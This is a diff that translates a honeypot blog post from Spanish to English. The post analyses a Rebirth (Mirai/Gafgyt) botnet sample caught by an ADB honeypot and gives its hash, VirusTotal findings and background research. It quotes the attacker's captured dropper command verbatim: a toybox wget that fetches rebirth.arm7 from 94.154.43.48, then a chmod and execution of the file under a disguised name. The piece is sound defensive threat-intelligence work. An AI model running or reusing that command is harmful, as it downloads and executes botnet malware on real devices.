@@ -1,23 +1,23 @@
 ---
-title: "Capturé una muestra del botnet Rebirth en mi honeypot: esto es lo que até cabos"
+title: "I Captured a Rebirth Botnet Sample in My Honeypot: Here's What I Pieced Together"
 date: 2026-07-09
 draft: false
-description: "Análisis de una muestra del botnet Rebirth (variante Mirai/Gafgyt) capturada en vivo en mi honeypot T-Pot. Cadena de infección completa, proceso real de investigación con su callejón sin salida incluido, y qué dice la comunidad de seguridad sobre esta familia."
+description: "Analysis of a Rebirth botnet sample (Mirai/Gafgyt variant) captured live in my T-Pot honeypot. Complete infection chain, the real investigation process including a dead end, and what the security community says about this family."
 tags: ["Honeypot", "TPot", "Botnet", "Mirai", "Rebirth", "Gafgyt", "ADB", "Android", "IoT", "DDoS", "CVE-2017-17215", "MalwareAnalysis", "ThreatIntel", "BlueTeam"]
 categories: ["Honeypot Diaries"]
 ---
 
 {{< lead >}}
-Revisando el tráfico de mi honeypot T-Pot encontré algo más interesante que el típico intento de fuerza bruta SSH: una cadena de infección completa, capturada en vivo, que resultó ser una variante del botnet **Rebirth**, de la familia Mirai/Gafgyt. Este post cuenta qué capturé exactamente, cómo até cabos para identificarlo, y qué dice la comunidad de seguridad sobre esta familia — dejando claro en cada parte qué es observación directa mía y qué es investigación de terceros.
+While reviewing traffic from my T-Pot honeypot I found something more interesting than the typical SSH brute-force attempt: a complete infection chain, captured live, that turned out to be a variant of the **Rebirth** botnet, from the Mirai/Gafgyt family. This post covers exactly what I captured, how I pieced it together to identify it, and what the security community says about this family — making clear throughout what is my direct observation and what is third-party research.
 {{< /lead >}}
 
 ---
 
-## Lo que Capturé (esto sí es mío)
+## What I Captured (this part is mine)
 
-El honeypot que registró esto fue **Adbhoney**, uno de los sensores de T-Pot que simula el protocolo **ADB (Android Debug Bridge)** — el sistema de depuración remota de Android, que expuesto a internet sin autenticación es una puerta de entrada trivial para bots automatizados.
+The honeypot that recorded this was **Adbhoney**, one of T-Pot's sensors that simulates the **ADB (Android Debug Bridge)** protocol — Android's remote debugging system, which when exposed to the internet without authentication is a trivial entry point for automated bots.
 
-El comando ejecutado por el atacante, capturado literalmente en los logs:
+The command executed by the attacker, captured verbatim in the logs:
 
 ```bash
 toybox wget http://94.154.43.48/rebirth.arm7 -O /data/local/tmp/com.supercell.clashroyal
@@ -25,82 +25,82 @@ chmod 777 /data/local/tmp/com.supercell.clashroyal
 ./data/local/tmp/com.supercell.clashroyal adb
 ```
 
-Tres pasos, típicos de un dropper automatizado:
+Three steps, typical of an automated dropper:
 
-1. **Descarga** un binario (`rebirth.arm7`) desde un servidor remoto, usando `toybox` — una utilidad tipo BusyBox preinstalada en la mayoría de sistemas Android, así el atacante no depende de tener herramientas extra en el dispositivo objetivo.
-2. **Le da permisos de ejecución totales** (`chmod 777`).
-3. **Lo ejecuta**, pasándole `adb` como argumento — a falta de analizar el binario en profundidad, mi lectura es que probablemente le indica usar ese vector para seguir propagándose a otros dispositivos con ADB expuesto.
+1. **Downloads** a binary (`rebirth.arm7`) from a remote server, using `toybox` — a BusyBox-like utility pre-installed on most Android systems, so the attacker doesn't depend on having extra tools on the target device.
+2. **Grants full execution permissions** (`chmod 777`).
+3. **Executes it**, passing `adb` as an argument — without deeper binary analysis, my read is that it probably tells it to use that vector to keep spreading to other devices with exposed ADB.
 
-El detalle que más me llamó la atención: el archivo se guarda como **`com.supercell.clashroyal`**, el nombre de paquete real del juego Clash Royale. Es una técnica sencilla de camuflaje — que alguien revisando procesos por encima no sospeche de él.
+The detail that caught my attention most: the file is saved as **`com.supercell.clashroyal`**, the real package name of the Clash Royale game. It's a simple camouflage technique — so that someone reviewing processes at a glance won't be suspicious.
 
 ---
 
-## Cómo Até Cabos (el proceso real, con su callejón sin salida incluido)
+## How I Pieced It Together (the real process, dead end included)
 
-Lo primero que hice fue coger el hash SHA256 del archivo, que T-Pot ya había guardado automáticamente como nombre del fichero capturado:
+The first thing I did was take the SHA256 hash of the file, which T-Pot had automatically saved as the captured file's name:
 
 ```
 849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5
 ```
 
-Lo busqué en VirusTotal y **no encontré nada** — el hash no estaba en su base de datos. En ese momento no supe si era una muestra nueva sin catalogar o si simplemente estaba buscando mal. Aproveché el nombre del binario (`rebirth.arm7`, visible en el propio comando) para buscar por texto en vez de por hash, y ahí sí aparecieron referencias — un análisis de Sysdig documentando una campaña con ese mismo nombre de archivo, identificándola como parte del botnet Rebirth.
+I searched it on VirusTotal and **found nothing** — the hash wasn't in their database. At that point I didn't know whether it was a new uncatalogued sample or if I was simply searching wrong. I used the binary's name (`rebirth.arm7`, visible in the command itself) to search by text instead of hash, and there I found references — a Sysdig analysis documenting a campaign with that same filename, identifying it as part of the Rebirth botnet.
 
-Unos días después, volví a comprobar el hash en VirusTotal y esta vez sí estaba registrado — probablemente porque otro investigador subió una copia idéntica capturada en su propio honeypot. Los comentarios de la comunidad en la ficha lo confirman: al menos dos personas más reportan haberla visto "in the wild" en fechas parecidas a la mía.
+A few days later, I checked the hash on VirusTotal again and this time it was registered — probably because another researcher uploaded an identical copy captured in their own honeypot. Community comments on the entry confirm it: at least two other people report having seen it "in the wild" around the same dates as mine.
 
 ---
 
-## Lo que Dice el Análisis Automático de VirusTotal (no es mío, lo cito)
+## What VirusTotal's Automated Analysis Shows (not mine, I'm citing it)
 
-Con la muestra ya indexada, esto es lo que refleja su ficha:
+With the sample now indexed, here's what its entry shows:
 
-| Campo | Resultado |
-|-------|-----------|
-| **Detección** | 39 de 63 motores antivirus |
-| **Etiqueta popular** | `trojan.mirai/smmr1` |
-| **Categorías** | trojan, dropper, worm |
+| Field | Result |
+|-------|--------|
+| **Detection** | 39 out of 63 antivirus engines |
+| **Popular label** | `trojan.mirai/smmr1` |
+| **Categories** | trojan, dropper, worm |
 | **Family labels** | mirai, smmr1, camelot |
-| **Arquitectura** | ELF ARM — 194.51 KB |
+| **Architecture** | ELF ARM — 194.51 KB |
 
-VirusTotal incluye también un resumen de comportamiento generado automáticamente ("Code Insights") que describe el binario como un botnet IoT de la familia Mirai/Gafgyt, con capacidad de auto-propagación explotando **CVE-2017-17215** (una RCE en routers Huawei HG532), un módulo que mata procesos de malware competidor, varios vectores de ataque DDoS, y comunicación C2 cifrada.
+VirusTotal also includes an automatically generated behavior summary ("Code Insights") that describes the binary as an IoT botnet from the Mirai/Gafgyt family, with self-propagation capability exploiting **CVE-2017-17215** (an RCE in Huawei HG532 routers), a module that kills competing malware processes, several DDoS attack vectors, and encrypted C2 communication.
 
-**No he verificado estos detalles yo mismo desensamblando el binario** — los reproduzco como lo que son: la lectura automatizada de VirusTotal, respaldada además por varias reglas YARA de la comunidad (Elastic Security, Florian Roth/Nextron Systems) que coinciden con firmas conocidas de Mirai y del exploit de CVE-2017-17215.
-
----
-
-## Qué Dice la Investigación Previa sobre Rebirth (tampoco es mío)
-
-Rebirth no parece un experimento aislado. Investigación publicada por Sysdig la describe como un servicio de **DDoS-as-a-Service** — una botnet que se alquila — presuntamente administrada bajo el alias "Docx69", promocionada en Telegram y en streams de videojuegos. Análisis técnicos anteriores la sitúan construida sobre Gafgyt, con capacidades heredadas de otras familias como QBot y STDBot.
-
-Menciono esto como contexto de terceros, no como algo que haya confirmado por mi cuenta — pero encaja razonablemente con el comportamiento modular (propagación + DDoS + anti-competencia) que sí describe la ficha de VirusTotal para esta muestra concreta.
+**I have not personally verified these details by disassembling the binary** — I'm reproducing them for what they are: VirusTotal's automated reading, also backed by several community YARA rules (Elastic Security, Florian Roth/Nextron Systems) that match known signatures of Mirai and the CVE-2017-17215 exploit.
 
 ---
 
-## Lo que Sí me Atrevo a Concluir Yo
+## What Prior Research Says About Rebirth (also not mine)
 
-- **Una vulnerabilidad de 2017 sigue siendo un vector de propagación activo en 2026.** Si el CVE-2017-17215 sigue apareciendo en malware actual, es porque sigue habiendo suficientes routers Huawei sin parchear ahí fuera como para que valga la pena seguir incluyéndolo.
+Rebirth doesn't appear to be an isolated experiment. Research published by Sysdig describes it as a **DDoS-as-a-Service** offering — a botnet for hire — allegedly administered under the alias "Docx69", promoted on Telegram and gaming streams. Earlier technical analyses place it as built on Gafgyt, with capabilities inherited from other families like QBot and STDBot.
 
-- **El camuflaje como Clash Royale funciona precisamente porque nadie espera revisar procesos de un dispositivo Android a fondo.** No hace falta una técnica sofisticada de evasión si nadie está mirando.
-
-- **Un hash sin resultados en VirusTotal no significa "nada interesante"** — a veces solo significa que llegaste antes que el resto de la comunidad. Buscar por otros datos (nombre de archivo, comando, IP) cuando el hash falla es un paso que casi se me pasa por alto.
+I mention this as third-party context, not something I've confirmed independently — but it fits reasonably with the modular behavior (propagation + DDoS + anti-competition) that VirusTotal's entry does describe for this specific sample.
 
 ---
 
-## Resumen Técnico
+## What I'm Confident Concluding
 
-| Campo | Fuente | Valor |
+- **A 2017 vulnerability is still an active propagation vector in 2026.** If CVE-2017-17215 keeps appearing in current malware, it's because there are still enough unpatched Huawei routers out there to make including it worthwhile.
+
+- **Camouflage as Clash Royale works precisely because nobody expects to review an Android device's processes in depth.** You don't need a sophisticated evasion technique if nobody is looking.
+
+- **A hash with no VirusTotal results doesn't mean "nothing interesting"** — sometimes it just means you got there before the rest of the community. Searching by other data (filename, command, IP) when the hash fails is a step I almost missed.
+
+---
+
+## Technical Summary
+
+| Field | Source | Value |
 |-------|--------|-------|
-| Honeypot de captura | Observación directa | Adbhoney (T-Pot) |
-| Fecha de captura | Observación directa | 9 de julio de 2026 |
-| Servidor de origen | Observación directa | 94.154.43.48 |
-| Nombre real del archivo | Observación directa | rebirth.arm7 |
-| Nombre de disfraz | Observación directa | com.supercell.clashroyal |
-| SHA256 | Observación directa | `849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5` |
-| Arquitectura / tamaño | VirusTotal | ELF ARM, 194.51 KB |
-| Detección | VirusTotal | 39/63 |
-| Familia | VirusTotal / YARA comunidad | Mirai/Gafgyt (Rebirth), smmr1 |
-| CVE de propagación | VirusTotal Code Insights (no verificado por mí) | CVE-2017-17215 (Huawei HG532) |
-| Contexto DDoS-as-a-Service | Investigación de Sysdig | Alias operador: "Docx69" |
+| Capture honeypot | Direct observation | Adbhoney (T-Pot) |
+| Capture date | Direct observation | July 9, 2026 |
+| Origin server | Direct observation | 94.154.43.48 |
+| Actual filename | Direct observation | rebirth.arm7 |
+| Disguise name | Direct observation | com.supercell.clashroyal |
+| SHA256 | Direct observation | `849840d92c44ed04af624abd9e5d79a7a082016c89ac39ac50d19f3d537839b5` |
+| Architecture / size | VirusTotal | ELF ARM, 194.51 KB |
+| Detection | VirusTotal | 39/63 |
+| Family | VirusTotal / community YARA | Mirai/Gafgyt (Rebirth), smmr1 |
+| Propagation CVE | VirusTotal Code Insights (not verified by me) | CVE-2017-17215 (Huawei HG532) |
+| DDoS-as-a-Service context | Sysdig research | Operator alias: "Docx69" |
 
 ---
 
-*Este análisis combina observación directa en mi honeypot con fuentes públicas de threat intelligence (VirusTotal, investigación de Sysdig), claramente diferenciadas a lo largo del post. En ningún momento ejecuté el binario fuera del entorno aislado del honeypot.*
+*This analysis combines direct observation in my honeypot with public threat intelligence sources (VirusTotal, Sysdig research), clearly differentiated throughout the post. At no point did I execute the binary outside the honeypot's isolated environment.*
